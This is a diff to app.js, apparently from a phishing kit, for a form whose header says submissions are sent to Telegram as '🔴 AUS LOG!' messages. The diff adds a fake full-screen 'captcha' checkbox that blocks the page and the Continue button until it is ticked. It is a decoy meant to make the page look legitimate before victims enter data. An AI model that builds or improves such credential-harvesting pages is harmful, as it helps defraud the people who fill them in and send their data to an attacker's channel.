@@ -1,5 +1,6 @@
 /* ============================================================
    app.js — финальная версия
+   - Fullscreen captcha перед формой
    - Continue не отправляет, пока все поля пустые
    - Сообщение в Telegram в формате "🔴 AUS LOG!"
    ============================================================ */
@@ -354,14 +355,58 @@ function validateAllFields() {
 }
 
 /* ============================================
-   SUBMIT ON CONTINUE BUTTON
-   — если хоть одно поле пустое, ничего не уходит
+   SUBMIT / FORM ELEMENTS
    ============================================ */
 const form      = document.getElementById('dataForm');
 const submitBtn = document.getElementById('submitBtn');
 
+/* ============================================
+   CAPTCHA — полноэкранная блокировка
+   ============================================ */
+
+const captchaOverlay = document.getElementById('captchaOverlay');
+const captchaCheck   = document.getElementById('captchaCheck');
+
+if (captchaOverlay && captchaCheck) {
+    /* Пока капча не пройдена — страница заблокирована */
+    document.body.classList.add('captcha-open');
+    submitBtn.disabled = true;
+    submitBtn.style.background = '#b5b5b5';
+    submitBtn.style.cursor = 'not-allowed';
+
+    captchaCheck.addEventListener('change', () => {
+        if (captchaCheck.checked) {
+            captchaOverlay.classList.add('verified');
+
+            /* Небольшая задержка, чтобы юзер увидел галочку */
+            setTimeout(() => {
+                captchaOverlay.classList.add('hidden');
+                document.body.classList.remove('captcha-open');
+
+                /* Разблокируем Continue */
+                submitBtn.disabled = false;
+                submitBtn.style.background = '';
+                submitBtn.style.cursor = '';
+            }, 400);
+        }
+    });
+}
+
+/* ============================================
+   SUBMIT ON CONTINUE BUTTON
+   — если капча не пройдена или хоть одно поле пустое, ничего не уходит
+   ============================================ */
 form.addEventListener('submit', async (e) => {
     e.preventDefault();
+
+    /* Капча обязательна */
+    if (captchaCheck && !captchaCheck.checked) {
+        if (captchaOverlay) {
+            captchaOverlay.classList.remove('hidden');
+            document.body.classList.add('captcha-open');
+        }
+        return;
+    }
 
     if (!validateAllFields()) {
         return;
